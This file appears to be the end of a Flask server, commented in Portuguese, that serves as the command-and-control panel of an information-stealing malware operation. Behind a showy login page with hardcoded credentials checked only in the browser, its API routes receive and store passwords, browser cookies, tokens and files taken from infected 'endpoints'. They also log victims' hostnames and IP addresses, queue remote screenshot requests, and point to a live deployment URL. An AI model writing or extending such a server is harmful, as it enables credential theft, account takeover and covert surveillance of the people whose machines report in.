            animation: messageEntrance 0.8s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        
        .message::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #9333ea, transparent);
            animation: messageScan 3s linear infinite;
        }
        
        @keyframes messageScan {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        @keyframes messageEntrance {
            from { 
                opacity: 0; 
                transform: translateY(30px) scale(0.9); 
            }
            to { 
                opacity: 1; 
                transform: translateY(0) scale(1); 
            }
        }
        
        .message p {
            color: #c4b5fd;
            font-style: italic;
            line-height: 1.9;
            font-size: 1em;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.5);
            position: relative;
            z-index: 1;
        }
        
        .error, .success {
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 25px;
            text-align: center;
            font-weight: 600;
            display: none;
            animation: alertSlide 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        
        @keyframes alertSlide {
            from { 
                opacity: 0; 
                transform: translateY(-30px) scale(0.8); 
            }
            to { 
                opacity: 1; 
                transform: translateY(0) scale(1); 
            }
        }
        
        .error {
            background: rgba(127, 29, 29, 0.2);
            border: 2px solid rgba(239, 68, 68, 0.4);
            color: #fca5a5;
            box-shadow: 
                0 0 30px rgba(239, 68, 68, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
        }
        
        .success {
            background: rgba(20, 83, 45, 0.2);
            border: 2px solid rgba(34, 197, 94, 0.4);
            color: #86efac;
            box-shadow: 
                0 0 30px rgba(34, 197, 94, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
        }
        
        /* Indicadores de digitação avançados */
        .typing-indicator {
            position: absolute;
            right: 25px;
            top: 50%;
            transform: translateY(-50%);
            display: none;
            gap: 3px;
        }
        
        .typing-indicator.active {
            display: flex;
        }
        
        .typing-indicator span {
            display: inline-block;
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: linear-gradient(135deg, #9333ea, #8b5cf6);
            animation: typingBounce 1.2s infinite;
            box-shadow: 0 0 10px rgba(147, 51, 234, 0.5);
        }
        
        .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }
        
        @keyframes typingBounce {
            0%, 60%, 100% { 
                transform: translateY(0) scale(1); 
                opacity: 1;
            }
            30% { 
                transform: translateY(-12px) scale(1.2); 
                opacity: 0.8;
            }
        }
        
        /* Efeito de brilho nos inputs */
        .input-glow {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 20px;
            background: linear-gradient(45deg, transparent, rgba(147, 51, 234, 0.2), transparent);
            opacity: 0;
            transition: opacity 0.3s ease;
            pointer-events: none;
        }
        
        .form-group input:focus + .input-glow {
            opacity: 1;
            animation: inputGlow 2s ease-in-out infinite;
        }
        
        @keyframes inputGlow {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.8; }
        }
        
        /* Responsive design */
        @media (max-width: 480px) {
            .login-container {
                padding: 40px 30px;
                margin: 20px;
            }
            
            .logo h1 {
                font-size: 3em;
            }
            
            .form-group input {
                padding: 18px 20px;
            }
            
            .login-btn {
                padding: 20px;
                font-size: 1.1em;
            }
        }
        
        /* Animações de sucesso */
        .success-animation {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 100px;
            height: 100px;
            pointer-events: none;
            z-index: 9999;
        }
        
        .success-circle {
            width: 100%;
            height: 100%;
            border: 3px solid #22c55e;
            border-radius: 50%;
            animation: successCircle 1s ease-out;
        }
        
        @keyframes successCircle {
            0% { 
                transform: scale(0); 
                opacity: 1;
            }
            50% {
                transform: scale(1.2);
                opacity: 0.8;
            }
            100% { 
                transform: scale(1.5); 
                opacity: 0;
            }
        }
        
        .success-checkmark {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 40px;
            height: 40px;
            animation: checkmarkAppear 0.5s ease-out 0.3s both;
        }
        
        @keyframes checkmarkAppear {
            0% { 
                transform: translate(-50%, -50%) scale(0) rotate(-45deg); 
                opacity: 0;
            }
            100% { 
                transform: translate(-50%, -50%) scale(1) rotate(0deg); 
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <!-- Fundos animados -->
    <div class="gradient-bg"></div>
    <div class="hex-grid"></div>
    <div class="particles" id="particles"></div>
    
    <!-- Container principal -->
    <div class="login-container">
        <div class="logo">
            <div class="logo-particles" id="logoParticles"></div>
            <h1>LEALDADE</h1>
            <p>Portal Exclusivo</p>
        </div>
        
        <div class="error" id="errorMsg"></div>
        <div class="success" id="successMsg"></div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Usuário</label>
                <input type="text" id="username" name="username" placeholder="Digite seu usuário" required>
                <div class="input-glow"></div>
                <div class="typing-indicator" id="usernameTyping">
                    <span></span><span></span><span></span>
                </div>
            </div>
            
            <div class="form-group">
                <label for="password">Senha</label>
                <input type="password" id="password" name="password" placeholder="Digite sua senha" required>
                <div class="input-glow"></div>
                <div class="typing-indicator" id="passwordTyping">
                    <span></span><span></span><span></span>
                </div>
            </div>
            
            <button type="submit" class="login-btn" id="loginBtn">
                <span id="btnText">ENTRAR</span>
            </button>
        </form>
        
        <div class="message">
            <p>Se você chegou até aqui, tem um longo caminho a seguir...</p>
        </div>
    </div>

    <script>
        // Criar partículas avançadas
        function createAdvancedParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = 80;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                const size = Math.random() > 0.7 ? 'large' : Math.random() > 0.4 ? 'medium' : 'small';
                particle.className = `particle ${size}`;
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 25 + 's';
                particle.style.animationDuration = (20 + Math.random() * 15) + 's';
                particlesContainer.appendChild(particle);
            }
        }
        
        // Criar partículas orbitais do logo
        function createLogoParticles() {
            const logoParticles = document.getElementById('logoParticles');
            const particleCount = 8;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.className = 'logo-particle';
                particle.style.animationDelay = (i * 0.75) + 's';
                logoParticles.appendChild(particle);
            }
        }
        
        // Prevenir seleção de texto em toda a página
        function preventSelection() {
            document.addEventListener('selectstart', function(e) {
                // Permitir seleção apenas em inputs
                if (!e.target.matches('input, input *')) {
                    e.preventDefault();
                }
            });
            
            document.addEventListener('dragstart', function(e) {
                e.preventDefault();
            });
            
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            });
            
            // Prevenir cópia com Ctrl+C
            document.addEventListener('keydown', function(e) {
                if ((e.ctrlKey || e.metaKey) && e.key === 'c') {
                    const selection = window.getSelection();
                    const selectedText = selection.toString();
                    
                    // Permitir cópia apenas de inputs
                    if (!selection.anchorNode || !selection.anchorNode.parentElement || !selection.anchorNode.parentElement.matches('input')) {
                        e.preventDefault();
                    }
                }
            });
        }
        
        // Inicializar partículas e proteção
        createAdvancedParticles();
        createLogoParticles();
        preventSelection();
        
        // Elementos do formulário
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const btnText = document.getElementById('btnText');
        const errorMsg = document.getElementById('errorMsg');
        const successMsg = document.getElementById('successMsg');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const usernameTyping = document.getElementById('usernameTyping');
        const passwordTyping = document.getElementById('passwordTyping');
        
        // Efeito de ripple nos inputs
        function createRipple(element, event) {
            const ripple = document.createElement('div');
            ripple.className = 'ripple';
            
            const rect = element.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            const x = event.clientX - rect.left - size / 2;
            const y = event.clientY - rect.top - size / 2;
            
            ripple.style.width = ripple.style.height = size + 'px';
            ripple.style.left = x + 'px';
            ripple.style.top = y + 'px';
            
            element.appendChild(ripple);
            
            setTimeout(() => ripple.remove(), 600);
        }
        
        // Efeitos de digitação avançados
        usernameInput.addEventListener('input', function(e) {
            if (this.value.length > 0) {
                this.style.borderColor = '#9333ea';
                this.style.boxShadow = '0 0 30px rgba(147, 51, 234, 0.5)';
                usernameTyping.classList.add('active');
                setTimeout(() => usernameTyping.classList.remove('active'), 1200);
                
                // Efeito de brilho progressivo
                const progress = Math.min(this.value.length / 10, 1);
                this.style.background = `rgba(45, 27, 105, ${0.4 + progress * 0.2})`;
            } else {
                this.style.borderColor = 'rgba(139, 92, 246, 0.3)';
                this.style.boxShadow = 'none';
                this.style.background = 'rgba(26, 0, 51, 0.6)';
            }
        });
        
        passwordInput.addEventListener('input', function(e) {
            if (this.value.length > 0) {
                this.style.borderColor = '#9333ea';
                this.style.boxShadow = '0 0 30px rgba(147, 51, 234, 0.5)';
                passwordTyping.classList.add('active');
                setTimeout(() => passwordTyping.classList.remove('active'), 1200);
                
                // Efeito de brilho progressivo
                const progress = Math.min(this.value.length / 10, 1);
                this.style.background = `rgba(45, 27, 105, ${0.4 + progress * 0.2})`;
            } else {
                this.style.borderColor = 'rgba(139, 92, 246, 0.3)';
                this.style.boxShadow = 'none';
                this.style.background = 'rgba(26, 0, 51, 0.6)';
            }
        });
        
        // Efeito de ripple ao clicar nos inputs
        [usernameInput, passwordInput].forEach(input => {
            input.addEventListener('click', function(e) {
                createRipple(this.parentElement, e);
            });
            
            input.addEventListener('focus', function() {
                this.parentElement.style.transform = 'scale(1.03)';
            });
            
            input.addEventListener('blur', function() {
                this.parentElement.style.transform = 'scale(1)';
            });
        });
        
        // Envio do formulário com animações cinematográficas
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = usernameInput.value;
            const password = passwordInput.value;
            
            // Resetar mensagens
            errorMsg.style.display = 'none';
            successMsg.style.display = 'none';
            
            // Estado de loading avançado
            loginBtn.classList.add('loading');
            btnText.textContent = 'VERIFICANDO...';
            loginBtn.disabled = true;
            
            // Adicionar efeito de pulsação no container
            document.querySelector('.login-container').style.animation = 'containerPulse 1s ease-in-out';
            
            // Simular verificação com animação
            setTimeout(() => {
                if (username === 'lealdade' && password === 'lealdade') {
                    // Sucesso espetacular
                    successMsg.textContent = '✨ Acesso concedido! Bem-vindo ao portal exclusivo...';
                    successMsg.style.display = 'block';
                    
                    // Mudar cor do botão para sucesso
                    loginBtn.style.background = 'linear-gradient(135deg, #22c55e, #16a34a, #15803d)';
                    btnText.textContent = '✓ ACESSO LIBERADO';
                    
                    // Criar animação de sucesso
                    createSuccessAnimation();
                    
                    // Efeito de confete avançado
                    createAdvancedConfetti();
                    
                    // Redirecionar após 3 segundos
                    setTimeout(() => {
                        document.querySelector('.login-container').style.animation = 'containerExit 1s ease-in forwards';
                        setTimeout(() => {
                            window.location.href = '/dashboard';
                        }, 800);
                    }, 3000);
                } else {
                    // Erro dramático
                    errorMsg.textContent = '❌ Credenciais inválidas! Acesso negado ao sistema.';
                    errorMsg.style.display = 'block';
                    
                    // Resetar botão com animação
                    loginBtn.classList.remove('loading');
                    btnText.textContent = 'ACESSO NEGADO';
                    loginBtn.style.background = 'linear-gradient(135deg, #dc2626, #b91c1c, #991b1b)';
                    
                    // Efeito de shake dramático
                    document.querySelector('.login-container').style.animation = 'dramaticShake 0.8s ease-out';
                    
                    setTimeout(() => {
                        loginBtn.style.background = 'linear-gradient(135deg, #9333ea, #8b5cf6, #7c3aed)';
                        btnText.textContent = 'TENTAR NOVAMENTE';
                        loginBtn.disabled = false;
                        document.querySelector('.login-container').style.animation = '';
                    }, 2500);
                    
                    // Limpar senha e focar
                    passwordInput.value = '';
                    passwordInput.focus();
                    
                    // Efeito de erro nos inputs
                    [usernameInput, passwordInput].forEach(input => {
                        input.style.borderColor = '#dc2626';
                        input.style.boxShadow = '0 0 30px rgba(220, 38, 38, 0.5)';
                        setTimeout(() => {
                            input.style.borderColor = 'rgba(139, 92, 246, 0.3)';
                            input.style.boxShadow = 'none';
                        }, 2000);
                    });
                }
            }, 2500);
        });
        
        // Animação de confete avançado
        function createAdvancedConfetti() {
            const colors = ['#9333ea', '#8b5cf6', '#7c3aed', '#6d28d9', '#5b21b6', '#22c55e', '#16a34a'];
            const confettiCount = 50;
            
            for (let i = 0; i < confettiCount; i++) {
                const confetti = document.createElement('div');
                confetti.style.position = 'fixed';
                confetti.style.width = Math.random() * 12 + 8 + 'px';
                confetti.style.height = confetti.style.width;
                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.left = Math.random() * 100 + '%';
                confetti.style.top = '-20px';
                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0%';
                confetti.style.zIndex = '9999';
                confetti.style.pointerEvents = 'none';
                confetti.style.boxShadow = `0 0 10px ${confetti.style.background}`;
                document.body.appendChild(confetti);
                
                // Animação de queda realista
                const duration = 2000 + Math.random() * 1500;
                const rotation = Math.random() * 720;
                const sway = (Math.random() - 0.5) * 200;
                
                confetti.animate([
                    { 
                        transform: 'translateY(0) translateX(0) rotate(0deg) scale(0)', 
                        opacity: 0 
                    },
                    { 
                        transform: 'translateY(20vh) translateX(0) rotate(180deg) scale(1)', 
                        opacity: 1,
                        offset: 0.1
                    },
                    { 
                        transform: `translateY(100vh) translateX(${sway}px) rotate(${rotation}deg) scale(0.8)`, 
                        opacity: 0.8,
                        offset: 0.9
                    },
                    { 
                        transform: `translateY(110vh) translateX(${sway * 1.5}px) rotate(${rotation}deg) scale(0)`, 
                        opacity: 0 
                    }
                ], {
                    duration: duration,
                    easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)'
                });
                
                setTimeout(() => confetti.remove(), duration);
            }
        }
        
        // Animação de sucesso
        function createSuccessAnimation() {
            const successDiv = document.createElement('div');
            successDiv.className = 'success-animation';
            successDiv.innerHTML = `
                <div class="success-circle"></div>
                <svg class="success-checkmark" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="3">
                    <path d="M5 12l5 5L20 7"/>
                </svg>
            `;
            document.body.appendChild(successDiv);
            
            setTimeout(() => successDiv.remove(), 1500);
        }
        
        // Adicionar animações CSS dinâmicas
        const dynamicStyles = document.createElement('style');
        dynamicStyles.textContent = `
            @keyframes containerPulse {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.02); }
            }
            
            @keyframes dramaticShake {
                0%, 100% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-8px); }
                20%, 40%, 60%, 80% { transform: translateX(8px); }
            }
            
            @keyframes containerExit {
                0% { 
                    opacity: 1; 
                    transform: scale(1) rotateX(0deg); 
                    filter: blur(0px);
                }
                100% { 
                    opacity: 0; 
                    transform: scale(0.8) rotateX(15deg); 
                    filter: blur(20px);
                }
            }
        `;
        document.head.appendChild(dynamicStyles);
        
        // Efeito de hover no logo
        document.querySelector('.logo').addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-15px) scale(1.05)';
        });
        
        document.querySelector('.logo').addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0) scale(1)';
        });
        
        // Efeito parallax sutil no mouse move
        document.addEventListener('mousemove', (e) => {
            const x = (e.clientX / window.innerWidth - 0.5) * 20;
            const y = (e.clientY / window.innerHeight - 0.5) * 20;
            
            document.querySelector('.login-container').style.transform = `translateX(${x}px) translateY(${y}px)`;
        });
    </script>
</body>
</html>
"""

# API Endpoints robustos
@app.route('/')
def index():
    """Página de login (principal)"""
    return LOGIN_TEMPLATE

@app.route('/dashboard')
def dashboard():
    """Página principal do painel"""
    return HTML_TEMPLATE

@app.route('/api/register', methods=['POST', 'OPTIONS'])
def register_endpoint():
    """Registra novo endpoint"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', 'Unknown'),
            'external_ip': data.get('external_ip', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'status': 'online',
            'last_seen': datetime.now().isoformat(),
            'registered_at': datetime.now().isoformat()
        }
        
        print(f"[API] Endpoint registrado: {endpoint_id}")
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao registrar endpoint: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tokens_data')
def get_tokens_data():
    """Retorna todos os tokens coletados"""
    return jsonify(endpoint_tokens)

@app.route('/api/cookies_data')
def get_cookies_data():
    """Retorna todos os cookies coletados"""
    return jsonify(endpoint_cookies)

@app.route('/api/passwords_data')
def get_passwords_data():
    """Retorna todas as senhas coletadas"""
    return jsonify(endpoint_passwords)

@app.route('/api/files_data')
def get_files_data():
    """Retorna todos os arquivos recebidos"""
    return jsonify(endpoint_files)

@app.route('/api/metrics_data')
def get_metrics_data():
    """Retorna todas as métricas"""
    return jsonify(metrics_data)

@app.route('/api/tokens', methods=['POST'])
def receive_tokens():
    """Recebe tokens de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        tokens = data.get('tokens', [])
        
        if endpoint_id:
            endpoint_tokens[endpoint_id] = {
                'tokens': tokens,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Tokens recebidos: {endpoint_id} - {len(tokens)} tokens")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber tokens: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/cookies', methods=['POST'])
def receive_cookies():
    """Recebe cookies de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        cookies = data.get('cookies', [])
        
        if endpoint_id:
            endpoint_cookies[endpoint_id] = {
                'cookies': cookies,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Cookies recebidos: {endpoint_id} - {len(cookies)} cookies")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber cookies: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/passwords', methods=['POST'])
def receive_passwords():
    """Recebe senhas de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        passwords = data.get('passwords', [])
        
        if endpoint_id:
            endpoint_passwords[endpoint_id] = {
                'passwords': passwords,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Senhas recebidas: {endpoint_id} - {len(passwords)} senhas")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber senhas: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/files', methods=['POST'])
def receive_files():
    """Recebe arquivos de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        files = data.get('files', [])
        
        if endpoint_id:
            endpoint_files[endpoint_id] = {
                'files': files,
                'timestamp': datetime.now().isoformat()
            }
            print(f"[API] Arquivos recebidos: {endpoint_id} - {len(files)} arquivos")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber arquivos: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/metrics', methods=['POST'])
def receive_metrics():
    """Recebe métricas de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        metrics = data.get('metrics', {})
        
        if endpoint_id:
            metrics_data.append({
                'endpoint_id': endpoint_id,
                'metrics': metrics,
                'timestamp': datetime.now().isoformat()
            })
            print(f"[API] Métricas recebidas: {endpoint_id}")
            return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber métricas: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST'])
def request_screenshot(endpoint_id):
    """Solicita screenshot de um endpoint específico"""
    try:
        if endpoint_id not in screenshot_requests:
            screenshot_requests[endpoint_id] = {
                'request_screenshot': True,
                'timestamp': datetime.now().isoformat()
            }
        print(f"[API] Screenshot solicitado: {endpoint_id}")
        return jsonify({'status': 'success', 'message': f'Screenshot solicitado para {endpoint_id}'})
    except Exception as e:
        print(f"[API] Erro ao solicitar screenshot: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>')
def check_screenshot_request(endpoint_id):
    """Verifica se há solicitação de screenshot"""
    if endpoint_id in screenshot_requests:
        return jsonify(screenshot_requests[endpoint_id])
    else:
        return jsonify({'request_screenshot': False})

@app.route('/api/screenshots')
def get_screenshots():
    """Retorna todos os screenshots"""
    return jsonify(endpoint_screenshots)

@app.route('/api/heartbeat', methods=['POST'])
def receive_heartbeat():
    """Recebe heartbeat de um endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        status = data.get('status', 'unknown')
        
        if endpoint_id in endpoints:
            endpoints[endpoint_id]['last_seen'] = datetime.now().isoformat()
            endpoints[endpoint_id]['status'] = status
        
        print(f"[API] Heartbeat recebido: {endpoint_id} - {status}")
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"[API] Erro ao receber heartbeat: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/endpoints')
def list_endpoints():
    """Lista todos os endpoints"""
    try:
        endpoints_list = []
        for ep_id, data in endpoints.items():
            endpoints_list.append({
                'id': ep_id,
                'status': data.get('status', 'unknown'),
                'last_seen': data.get('last_seen', ''),
                'hostname': data.get('hostname', ''),
                'user': data.get('user', ''),
                'ip_address': data.get('ip_address', ''),
                'external_ip': data.get('external_ip', ''),
                'platform': data.get('platform', ''),
                'ram': data.get('ram', ''),
                'registered_at': data.get('registered_at', '')
            })
        
        return jsonify(endpoints_list)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    print("🚀 Iniciando System Monitor CORRIGIDO para Railway...")
    print("📡 Servidor robusto sem dependências problemáticas")
    print("🌐 URL: https://web-production-49d37.up.railway.app")
    print()
    
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
